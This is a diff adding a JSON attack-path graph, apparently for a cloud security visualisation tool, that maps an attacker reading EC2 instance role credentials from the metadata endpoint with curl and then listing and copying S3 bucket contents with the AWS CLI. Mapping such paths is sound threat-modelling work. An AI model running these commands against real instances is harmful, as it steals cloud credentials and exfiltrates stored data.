@@ -1,0 +1,48 @@
+{
+    "title": "Exploit EC2 Instance Role to Access S3 Buckets",
+    "icon": "https://img.icons8.com/?size=100&id=jjoPDBNb5bi9&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "Get IAM Role Credentials",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/key.png",
+            "details": {
+                "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>",
+                "description": "Retrieves IAM role credentials assigned to the EC2 instance.",
+                "services": ["EC2"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "List S3 Buckets",
+            "icon": "https://img.icons8.com/?size=100&id=11764&format=png&color=000000",
+            "details": {
+                "command": "aws s3 ls",
+                "description": "Lists all S3 buckets in the specified AWS account.",
+                "services": ["S3"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Access S3 Bucket",
+            "icon": "https://img.icons8.com/?size=100&id=jjoPDBNb5bi9&format=png&color=000000",
+            "details": {
+                "command": "aws s3 cp s3://<BucketName>/<ObjectKey> <LocalPath>",
+                "description": "Accesses and copies data from the specified S3 bucket using the EC2 instance role credentials.",
+                "services": ["S3"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/s3/cp.html"
+            }
+        }
+    ]
+}
